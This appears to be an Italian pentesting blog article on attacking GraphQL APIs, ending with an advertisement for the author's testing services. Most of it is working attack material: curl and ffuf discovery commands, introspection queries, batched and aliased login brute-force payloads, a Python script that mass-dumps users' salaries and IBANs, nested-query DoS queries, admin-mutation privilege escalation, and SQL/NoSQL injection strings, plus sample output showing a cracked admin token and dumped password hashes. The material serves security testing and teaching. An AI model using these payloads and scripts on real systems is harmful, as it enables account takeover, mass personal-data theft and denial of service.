---
title: 'GraphQL Attacks: Introspection, Batching e Data Breach'
slug: graphql-exploitation
description: >-
  Scopri come testare GraphQL nel pentesting web: introspection, batching,
  authorization bypass, IDOR, brute force e data leak via query.
image: /graphql-exploitation.webp
draft: false
date: 2026-03-15T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - api
featured: true
---

GraphQL è una di quelle tecnologie che fanno sorridere un pentester. A differenza delle API REST — dove devi scoprire ogni endpoint con fuzzing e reverse engineering — GraphQL ha un **singolo endpoint** che espone un linguaggio di query completo. E la parte migliore: la funzionalità di **introspection** permette di chiedere all'API "dimmi tutto quello che sai fare", e lei risponde con lo schema completo. Ogni tipo, ogni campo, ogni query, ogni mutation. Incluse quelle che il frontend non usa ma il backend espone lo stesso.

Ma GraphQL non è solo introspection. Il **batching** — inviare centinaia di query in una singola request HTTP — rende il rate limit praticamente inutile: 1.000 tentativi di login in una request, zero alert. Le **mutation non protette** permettono escalation di privilegi. Le **relazioni tra tipi** permettono di attraversare il grafo dei dati e raggiungere informazioni di altri utenti, altre aziende, altri tenant.

Satellite della [guida pillar API & Modern Web Attacks](https://hackita.it/articoli/api-modern-web-attacks-guida-completa). Vedi anche: [SSRF](https://hackita.it/articoli/ssrf), [IDOR](https://hackita.it/articoli/idor), [Brute Force](https://hackita.it/articoli/brute-force).

Riferimenti: [PortSwigger GraphQL](https://portswigger.net/web-security/graphql), [HackTricks GraphQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html), [The Guild Security](https://the-guild.dev/graphql/security).

***

## Discovery — Trovare L'Endpoint

```bash
# Path comuni:
/graphql        /api/graphql       /graphql/v1
/query          /gql               /api/v2/graphql

# IDE interattivi (se esposti = testi le query nel browser):
/graphiql       /playground        /altair       /explorer

# Conferma — query minima:
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'
# Response: {"data":{"__typename":"Query"}} → GraphQL confermato!

# Anche un errore di sintassi conferma:
curl -s -X POST "https://target.com/graphql" \
  -d '{"query":"{"}'
# {"errors":[{"message":"Syntax Error: Expected Name..."}]} → attivo!

# ffuf per trovare il path:
ffuf -u "https://target.com/FUZZ" \
  -w <(echo -e "graphql\ngraphiql\nplayground\napi/graphql\nquery") \
  -X POST -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}' -mc 200

# Fingerprint motore:
python3 graphw00f.py -t https://target.com/graphql
# → Apollo, Hasura, Graphene, Yoga, graphql-java, etc.
# Il motore influenza quali attacchi funzionano
```

***

## Introspection — La Mappa Completa

L'introspection è il primo test. Se è abilitata, hai la mappa dell'intera API:

```bash
# Query completa (salva lo schema):
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields(includeDeprecated:true) { name type { name kind ofType { name } } args { name type { name } } } } } }"}' \
  | python3 -m json.tool > schema.json
```

### Cosa Cercare Nello Schema

```bash
# Campi sensibili nei tipi:
# User → passwordHash, ssn, creditCard, salary, iban, apiKey, mfaSecret
# SystemConfig → awsKey, dbPassword, stripeSecret

# Mutation pericolose:
# createAdmin, deleteUser, changeRole, exportDatabase
# resetPassword, disableMFA, updateSystemConfig

# Relazioni traversabili (per raggiungere dati di ALTRI utenti):
# User → orders → payments → creditCard
# User → company → employees → salary

# Campi deprecati (spesso meno protetti dei nuovi)
```

### Se L'Introspection È Disabilitata

Non è la fine. GraphQL suggerisce campi simili quando sbagli il nome:

```bash
# Test:
curl -s -X POST "https://target.com/graphql" \
  -d '{"query":"{ use }"}'
# {"errors":[{"message":"Did you mean 'user', 'users', 'userByEmail'?"}]}
# → Tre query scoperte senza introspection!

# Brute force con parole comuni:
for word in user users me admin orders products payments companies \
  employees settings config dashboard export role permissions; do
  result=$(curl -s -X POST "https://target.com/graphql" \
    -d "{\"query\":\"{ $word { id } }\"}")
  echo "$result" | grep -qv "Cannot query" && echo "[+] FOUND: $word"
  echo "$result" | grep -o "Did you mean.*"
done

# Tool dedicato — ricostruisce lo schema senza introspection:
# Clairvoyance (https://github.com/nikitastupin/clairvoyance)
clairvoyance https://target.com/graphql -w wordlist.txt -o schema.json
```

***

## Batching — Il Killer Del Rate Limit

GraphQL accetta **multiple query in una singola request HTTP**. Il rate limit conta le request HTTP, non le query dentro. Questo cambia completamente l'economia del brute force:

### Login Brute Force

```json
[
  {"query": "mutation { login(email:\"admin@target.com\", password:\"Password1!\") { token } }"},
  {"query": "mutation { login(email:\"admin@target.com\", password:\"Company2026!\") { token } }"},
  {"query": "mutation { login(email:\"admin@target.com\", password:\"Welcome1!\") { token } }"},
  {"query": "mutation { login(email:\"admin@target.com\", password:\"Admin123!\") { token } }"},
  {"query": "mutation { login(email:\"admin@target.com\", password:\"Milano2026!\") { token } }"}
]
// 1 request HTTP → 5 tentativi (scala a 100-1000)
// Il rate limit vede 1 request → nessun blocco
```

### Alias Batching (Quando L'Array Non Funziona)

```graphql
{
  a1: login(email: "admin@target.com", password: "Password1!") { token }
  a2: login(email: "admin@target.com", password: "Company2026!") { token }
  a3: login(email: "admin@target.com", password: "Admin123!") { token }
  a4: login(email: "admin@target.com", password: "Welcome1!") { token }
}
# UNA query, UNA request, 4 tentativi. Scala a 1000 alias.
```

### Data Extraction Massiva

```graphql
{
  u1: user(id: 1) { name email salary iban }
  u2: user(id: 2) { name email salary iban }
  u3: user(id: 3) { name email salary iban }
  # ... u1000
}
# 1 request → 1000 profili completi
```

### Script Python

```python
#!/usr/bin/env python3
"""graphql_batch.py — Mass extraction via batching"""
import requests, json

URL = "https://target.com/graphql"
HEADERS = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}
BATCH = 100
all_users = []

for start in range(1, 10001, BATCH):
    aliases = [f'u{i}: user(id: {i}) {{ id name email salary iban }}'
               for i in range(start, start + BATCH)]
    query = "{ " + " ".join(aliases) + " }"
    data = requests.post(URL, headers=HEADERS, json={"query": query}).json().get("data", {})
    all_users.extend(v for v in data.values() if v)
    print(f"\r[+] {len(all_users)} users", end="")

with open("dump.json", "w") as f:
    json.dump(all_users, f, indent=2)
print(f"\n[*] Total: {len(all_users)}")
```

***

## Nested Query DoS

Se lo schema ha relazioni circolari (User → posts → author → posts → author...), la complessità esplode ad ogni livello:

```graphql
{
  users {              # 100 utenti
    posts {            # × 50 post = 5.000
      author {         # × 1 = 5.000
        posts {        # × 50 = 250.000
          author {     # × 1 = 250.000
            posts {    # × 50 = 12.500.000
              title
            }
          }
        }
      }
    }
  }
}
# 12.5 milioni di record → CPU al 100% → Application DoS
# Se non c'è query depth limit → confermato
```

***

## Authorization Bypass — Query Che Il Frontend Non Fa

Questa è la vulnerabilità logica più comune in GraphQL. Il frontend chiama solo `{ me { name email } }`. Ma lo schema espone query e mutation per **tutti i ruoli** — e il backend non verifica chi sta chiamando cosa.

```bash
# Con token utente NORMALE:
curl -X POST "https://target.com/graphql" \
  -H "Authorization: Bearer NORMAL_USER_TOKEN" \
  -d '{"query":"{ users { id email passwordHash salary role } }"}'
# Se risponde con TUTTI gli utenti → authorization bypass!

# Mutation admin:
'mutation { changeRole(userId: 1337, role: "admin") { id role } }'
'mutation { deleteUser(id: 1338) { success } }'
'mutation { exportDatabase(format: "csv") { downloadUrl } }'
# Se funzionano con token utente normale → privilege escalation!

# Cross-tenant (SaaS multi-tenant):
'{ company(id: 200) { name employees { name salary email } } }'
# Se l'utente di Company 100 vede i dati di Company 200 → cross-tenant leak
```

***

## GraphQL Injection

Se i parametri GraphQL finiscono in query SQL o NoSQL nel backend:

```bash
# SQLi:
'{ user(name: "admin\' OR \'1\'=\'1") { id email } }'
# → SELECT * FROM users WHERE name = 'admin' OR '1'='1'

# Time-based in sort:
'{ products(sort: "price, (SELECT SLEEP(5))") { name } }'

# NoSQL (MongoDB):
'{ user(filter: {name: {$ne: null}}) { id email } }'   # Tutti
'{ user(filter: {password: {$regex: "^a"}}) { id } }'  # Char by char
```

***

## Tool — InQL Workflow In Burp

```
1. Installa InQL dal BApp Store
2. Target → click destro → Send to InQL
3. InQL esegue introspection automatica
4. Tab "Scanner": mappa query, mutation, subscription
5. Genera query di test pronte per Repeater
6. "Analyze" per campi sensibili e mutation pericolose

# CLI: graphw00f per fingerprint motore
# CLI: clairvoyance per schema recovery senza introspection
```

***

## Output Reale — Introspection → Data Breach

### Schema Discovery

```bash
$ curl -s -X POST "https://target.com/graphql" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' \
  | python3 -c "
import json,sys
for t in json.load(sys.stdin)['data']['__schema']['types']:
  if t['kind']=='OBJECT' and not t['name'].startswith('__'):
    bad=[f['name'] for f in (t.get('fields') or []) 
         if any(k in f['name'].lower() for k in ['password','salary','iban','secret','key'])]
    if bad: print(f'[!] {t[\"name\"]}: {bad}')
"
[!] User: ['passwordHash', 'apiKey']
[!] Employee: ['salary', 'iban', 'taxId']
[!] SystemConfig: ['dbPassword', 'stripeSecretKey']
```

### Batching Brute Force

```bash
$ curl -s -X POST "https://target.com/graphql" \
  -d '[
    {"query":"mutation{login(email:\"admin@co.it\",password:\"Password1!\"){token}}"},
    {"query":"mutation{login(email:\"admin@co.it\",password:\"Azienda2026!\"){token}}"},
    {"query":"mutation{login(email:\"admin@co.it\",password:\"Admin123!\"){token}}"}
  ]'

[
  {"data":{"login":null}},
  {"data":{"login":{"token":"eyJhbGciOiJIUzI1NiJ9..."}}},
  {"data":{"login":null}}
]
# → "Azienda2026!" — token admin in 1 request HTTP, 0 alert.
```

### Data Dump

```bash
$ curl -s -X POST "https://target.com/graphql" \
  -H "Authorization: Bearer NORMAL_USER_TOKEN" \
  -d '{"query":"{ users { id email passwordHash salary } }"}' | head -20

{
  "data": {
    "users": [
      {"id":"1","email":"admin@azienda.it","passwordHash":"$2b$12$LJ3...","salary":120000},
      {"id":"2","email":"mario.rossi@azienda.it","passwordHash":"$2b$12$xK9...","salary":52000},
      ...
    ]
  }
}
# → Hash password e stipendi di TUTTI gli utenti. Una query.
```

***

## Workflow Operativo

### Fase 1 — Discovery (0-5 min)

Trova l'endpoint, conferma GraphQL, fingerprint motore, verifica se GET funziona (→ CSRF possibile).

### Fase 2 — Introspection (5-15 min)

Schema completo → cerca campi sensibili e mutation pericolose. Se disabilitata → field suggestion + clairvoyance.

### Fase 3 — Authorization (15-25 min)

Con token utente normale: chiama ogni query/mutation admin. Testa cross-tenant. Testa relazioni traversabili.

### Fase 4 — Batching (25-35 min)

Brute force login con 100+ mutation in 1 request. Data extraction con 1000 alias. OTP brute force.

### Fase 5 — Injection + DoS (35-45 min)

Parametri → SQLi/NoSQL. Nested query → depth limit presente?

***

## Enterprise Escalation

### Introspection → Data Breach

```
/graphql introspection → schema con Employee.salary, Employee.iban, Employee.taxId
→ { employees { name salary iban taxId } } → 50.000 dipendenti
→ Nessun filtro per company → cross-tenant su 200 aziende
→ DATA BREACH + NOTIFICA GDPR
```

### Batching → Admin Takeover

```
1000 mutation login in 1 request → password admin "Azienda2026!"
→ mutation changeRole → secondo admin account (persistence)
→ mutation exportDatabase → dump completo
→ ADMIN TAKEOVER + DATA EXFILTRATION
```

***

## Caso Studio

**Settore:** Piattaforma HR SaaS italiana, Apollo Server, 200 aziende, 50.000 dipendenti.

Introspection abilitata. Lo schema conteneva `Employee` con `salary`, `iban`, `taxId`, `performanceReview`, e `AdminMutation` con `exportCompanyData`, `changeEmployeeRole`. Come utente di Company 42: `{ users { salary iban taxId } }` → dati di **tutti i 50.000 dipendenti di tutte le 200 aziende**. Nessun filtro tenant nel resolver.

La mutation `changeEmployeeRole(userId: 1337, role: "admin")` funzionava senza check ruolo. Con il batching, 50 request HTTP (1.000 alias ciascuna) → dump completo in 30 secondi.

**Lo schema GraphQL era la documentazione completa dell'attacco.**

***

## ✅ Checklist GraphQL

```
DISCOVERY
☐ Endpoint trovato (e varianti: /graphiql, /playground)
☐ Motore identificato (graphw00f)
☐ GET supportato? (→ CSRF possibile)

INTROSPECTION
☐ Query introspection eseguita e schema salvato
☐ Se disabilitata → field suggestion testata
☐ Se disabilitata → clairvoyance eseguito
☐ Campi sensibili identificati (password, salary, key)
☐ Mutation pericolose identificate (delete, changeRole, export)
☐ Relazioni traversabili mappate

AUTHORIZATION
☐ Query admin con token normale → dati visibili?
☐ Mutation admin con token normale → funziona?
☐ Cross-tenant → Company A vede Company B?
☐ IDOR via relazioni → dati di altri utenti?

BATCHING
☐ Array di query supportato?
☐ Alias batching supportato?
☐ Login brute force via batching testato
☐ Data extraction massiva testata
☐ Rate limit conta HTTP request o query GraphQL?

DOS
☐ Nested query → depth limit presente?
☐ Complexity limit presente?
☐ Query timeout presente?

INJECTION
☐ Parametri → SQL injection (' e SLEEP)
☐ Parametri → NoSQL injection ($ne, $regex)
☐ Parametri sort/order → ORDER BY injection?
```

***

Riferimenti: [PortSwigger GraphQL](https://portswigger.net/web-security/graphql), [HackTricks GraphQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html), [The Guild Security](https://the-guild.dev/graphql/security), [InQL](https://github.com/doyensec/inql), [Clairvoyance](https://github.com/nikitastupin/clairvoyance).

Satellite della [Guida API & Modern Web Attacks](https://hackita.it/articoli/api-modern-web-attacks-guida-completa). Vedi anche: [SSRF](https://hackita.it/articoli/ssrf), [IDOR](https://hackita.it/articoli/idor), [Brute Force](https://hackita.it/articoli/brute-force).

> L'introspection è abilitata in produzione? Il batching è limitato? Le mutation admin sono protette? I resolver filtrano per tenant? [Penetration test API HackIta](https://hackita.it/servizi) per testare ogni angolo del tuo GraphQL. Dall'introspection al data breach: [formazione 1:1](https://hackita.it/formazione).
